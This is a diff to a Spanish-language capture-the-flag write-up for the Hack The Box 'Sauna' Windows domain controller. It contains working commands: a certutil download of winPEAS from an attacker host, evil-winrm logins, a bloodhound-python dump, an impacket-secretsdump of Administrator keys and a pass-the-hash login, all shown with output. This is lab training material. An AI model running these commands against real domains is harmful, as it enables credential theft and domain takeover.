@@ -297,6 +297,20 @@ DefaultDomainName DefaultUserName                 DefaultPassword
 ----------------- ---------------                 ---------------
 EGOTISTICALBANK   EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!
 ```
+Este comando lo que hace busca en el sistema si hay unas credenciales por defectos y vemos que nos da una password y un suario, pero si nos fijamos en los directorios de Users no se encuentra ese usuario 
+
+```bash
+🧉
+*Evil-WinRM* PS C:\Users\FSmith\Documents> net users
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            FSmith                   Guest
+HSmith                   krbtgt                   svc_loanmgr
+The command completed with one or more errors.
+```
+
 
 usuario: svc_loanmanager
 usuario: svc_loanmgr
@@ -364,7 +378,8 @@ certutil.exe -urlcache -split -f http://${IP}/${PORT}/winpeas.exe winpeas.exe
 
 ```
 
-```
+```bash
+🧉
   [+] Looking for AutoLogon credentials
     Some AutoLogon credentials were found
     DefaultDomainName             :  EGOTISTICALBANK
@@ -372,11 +387,69 @@ certutil.exe -urlcache -split -f http://${IP}/${PORT}/winpeas.exe winpeas.exe
     DefaultPassword               :  Moneymakestheworldgoround!
 ```
 
-### Herramientas para utilizar en Active Directory
+### Uso de Crackmapexec 
+
+
+### Iniciamos sesion con el usuario svc_loanmanger por medio de Evil-winrm 
+
+```bash
+🧉
+# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> whoami /all
+....
+USER INFORMATION
+----------------
+
+User Name                   SID
+=========================== ==============================================
+egotisticalbank\svc_loanmgr S-1-5-21-2966785786-3096785034-1186376766-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+```
+
+### Instalacion de las siguientes tools para usar en directorios activos.
 
 Pasamos hacer uso de esta herramienta tenemos que instalar las siguientes herramientas
 
 ```bash
+🧉
 sudo apt-get install neo4j bloodhound -y
 ```
 
@@ -384,19 +457,199 @@ sudo apt-get install neo4j bloodhound -y
 
 Es una base de datos no relacional
 
+### Que es bloodhound?
+
+
+dejo el repositorio para que puedan instalar la tools 
+https://github.com/fox-it/BloodHound.py
+
+pasamos a utilizar la tools de bloodhound 
+
 ```bash
+🧉
+bloodhound-python -c all -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -v
+```
+
+Lo que hacemos aca extraer unos archivos en formato json
+
+```bash
+🧉
+ls
+computers.json  domains.json  groups.json  man  users.json
+```
+
+Ahora procedo abrir por un lado el neo4j 
+
+```bash
+🧉
+neo4j console
+Directories in use:
+  home:         /usr/share/neo4j
+  config:       /usr/share/neo4j/conf
+  logs:         /usr/share/neo4j/logs
+  plugins:      /usr/share/neo4j/plugins
+  import:       /usr/share/neo4j/import
+  data:         /usr/share/neo4j/data
+  certificates: /usr/share/neo4j/certificates
+  run:          /usr/share/neo4j/run
+Starting Neo4j.
+WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+2021-06-19 17:36:54.926+0000 INFO  Starting...
+2021-06-19 17:36:59.273+0000 INFO  ======== Neo4j 4.2.1 ========
+2021-06-19 17:37:01.685+0000 INFO  Performing postInitialization step for component 'security-users' with version 2 and status CURRENT
+2021-06-19 17:37:01.685+0000 INFO  Updating the initial password in component 'security-users'  
+2021-06-19 17:37:02.147+0000 INFO  Bolt enabled on localhost:7687.
+2021-06-19 17:37:04.006+0000 INFO  Remote interface available at http://localhost:7474/
+2021-06-19 17:37:04.007+0000 INFO  Started.
+```
+
+Por defecto nos abre un local host en el puerto 7474 , procedo abrilo desde el navegador y configuro su usuario y contraseña
+su usuario lo dejo por defecto neo4j y contraseña le pongo "chango".
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine01.png)"</span>
+
+y le damos a conectar.
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine02.png)"</span>
+
+
+Lo siguiente es en otra terminal abrir el bloodhound , vamos a ponerlo en segundo plano
+
+```bash
+🧉
+sleep 2; bloodhound > /dev/null 2>&1 &                                                                             
+[1] 2377
+```
+
+hago q el proceso sea independiente, para que sea un proceso padre con este comando. 
+
+```bash
+🧉
+disown
+```
+
+Con Ustedes Bloodhound !
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine03.png)"</span>
+
+
+Bueno ahora subo los 4 archivos en formato json , el cual obtuvimos drumpeando con el comando bloodhound-python.
+y vamos a encontra mucha informacion sobre este dominio ,  y podemos obtener mucha informacion y diferentes ataques que nos indica.
+
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine04.png)"</span>
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine05.png)"</span>
+
+<span style="display:block;text-align:center">![Sauna](./images/10.10.10.175-machine06.png)"</span>
+
+
+Pero vamos a utilizar la utilidad de secrets impacket donde voy a cargar los siguientes parametros para
+conseguir un HASH de un usuario Administrador 
+
+```bash
+🧉
 impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
 ```
 
-```
+```bash 
+🧉
 [*] Kerberos keys grabbed
 Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
 Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
 Administrator:des-cbc-md5:19d5f15d689b1ce5
 ```
 
-svc_loanmanager
-svc_loanmgr
-Moneymakestheworldgoround!
+```bash
+evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                     SID
+============================= =============================================
+egotisticalbank\administrator S-1-5-21-2966785786-3096785034-1186376766-500
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                             Type             SID                                           Attributes
+====================================================== ================ ============================================= ===============================================================
+Everyone                                               Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                                 Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Users                                          Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access             Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                                   Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                       Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                         Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
+EGOTISTICALBANK\Group Policy Creator Owners            Group            S-1-5-21-2966785786-3096785034-1186376766-520 Mandatory group, Enabled by default, Enabled group
+EGOTISTICALBANK\Domain Admins                          Group            S-1-5-21-2966785786-3096785034-1186376766-512 Mandatory group, Enabled by default, Enabled group
+EGOTISTICALBANK\Schema Admins                          Group            S-1-5-21-2966785786-3096785034-1186376766-518 Mandatory group, Enabled by default, Enabled group
+EGOTISTICALBANK\Enterprise Admins                      Group            S-1-5-21-2966785786-3096785034-1186376766-519 Mandatory group, Enabled by default, Enabled group
+EGOTISTICALBANK\Denied RODC Password Replication Group Alias            S-1-5-21-2966785786-3096785034-1186376766-572 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication                       Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level                   Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+```
+
+y Listo capturada la bandera de usuario root !
+
+```bash
+C:\Users\Administrator\Desktop> type root.txt
+f3ee04965c68257382e31502cc5e881f
+```
+
+Mate Hacking !!!
+
+
+
 
 
